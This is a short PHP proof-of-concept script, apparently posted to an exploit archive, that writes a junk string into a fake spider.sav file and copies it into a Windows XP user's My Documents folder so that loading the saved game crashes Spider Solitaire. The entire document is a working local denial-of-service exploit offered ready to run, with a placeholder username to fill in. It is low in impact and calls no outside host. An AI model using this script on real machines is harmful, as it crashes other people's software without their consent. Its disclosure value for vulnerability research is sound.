<?php
/*
Spider Solitaire (Windows XP SP2) Local Crash PoC
By SirGod
www.insecurity.ro
www.twitter.com/SirGod
Loading a corrupt save file(spider.sav) will result in a local crash of Spider Solitaire
*/

$username="pwn"; //Replace with your computer username
$file="spider.sav";
$junk="Spider Solitaire Local Crash";
$handle = fopen($file, 'w') or die("Can't create file");
fwrite($handle,$junk);
fclose($handle);
$file2="C:/Documents and Settings/" .$username. "/My Documents/spider.sav";
if(!copy($file,$file2))
{
    die("Can't copy file");
}
  else
{
  echo "File succesfully copied.Open Spider Solitaire and load the last saved game";
};
?>